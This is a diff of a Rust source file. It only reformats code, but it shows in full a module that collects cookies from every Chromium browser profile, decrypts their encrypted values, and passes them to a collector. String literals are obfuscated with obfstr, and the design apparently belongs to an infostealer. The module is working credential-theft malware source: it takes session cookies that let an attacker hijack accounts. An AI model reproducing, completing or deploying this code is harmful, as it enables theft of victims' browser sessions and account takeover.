@@ -1,21 +1,21 @@
 use crate::alloc::borrow::ToOwned;
-use crate::chromium::{decrypt_data, BrowserData};
-use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Cookie};
+use crate::chromium::{BrowserData, decrypt_data};
+use crate::{Cookie, collect_and_read_sqlite_from_all_profiles, to_string_and_write_all};
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
 use obfstr::obfstr as s;
-use tasks::{parent_name, Task};
+use tasks::{Task, parent_name};
 use utils::path::Path;
 
-const COOKIES_HOST_KEY: usize        = 1;
-const COOKIES_NAME: usize            = 3;
+const COOKIES_HOST_KEY: usize = 1;
+const COOKIES_NAME: usize = 3;
 const COOKIES_ENCRYPTED_VALUE: usize = 5;
-const COOKIES_PATH: usize            = 6;
-const COOKIES_EXPIRES_UTC: usize     = 7;
+const COOKIES_PATH: usize = 6;
+const COOKIES_EXPIRES_UTC: usize = 7;
 
 pub(super) struct CookiesTask {
-    browser: Arc<BrowserData>
+    browser: Arc<BrowserData>,
 }
 
 impl CookiesTask {
@@ -29,12 +29,12 @@ impl<C: Collector> Task<C> for CookiesTask {
 
     fn run(&self, parent: &Path, collector: &C) {
         let Some(cookies) = collect_and_read_sqlite_from_all_profiles(
-            &self.browser.profiles, 
+            &self.browser.profiles,
             |profile| profile / s!("Network") / s!("Cookies"),
             s!("Cookies"),
-            |record| extract_cookie_from_record(record, &self.browser)
+            |record| extract_cookie_from_record(record, &self.browser),
         ) else {
-            return
+            return;
         };
 
         collector.get_browser().increase_cookies_by(cookies.len());
@@ -42,25 +42,23 @@ impl<C: Collector> Task<C> for CookiesTask {
     }
 }
 
-fn extract_cookie_from_record(record: &dyn TableRecord, browser_data: &BrowserData) -> Option<Cookie> {
+fn extract_cookie_from_record(
+    record: &dyn TableRecord,
+    browser_data: &BrowserData,
+) -> Option<Cookie> {
     let host_key = record.get_value(COOKIES_HOST_KEY)?.as_str()?.to_owned();
     let name = record.get_value(COOKIES_NAME)?.as_str()?.to_owned();
     let path = record.get_value(COOKIES_PATH)?.as_str()?.to_owned();
     let expires_utc = record.get_value(COOKIES_EXPIRES_UTC)?.as_integer()?;
 
     let encrypted_value = record.get_value(COOKIES_ENCRYPTED_VALUE)?.as_blob()?;
-    let value = unsafe {
-        decrypt_data(
-            &encrypted_value,
-            browser_data
-        )
-    }?;
+    let value = unsafe { decrypt_data(&encrypted_value, browser_data) }?;
 
     Some(Cookie {
         host_key,
         name,
         value: value.into(),
         path,
-        expires_utc
+        expires_utc,
     })
 }
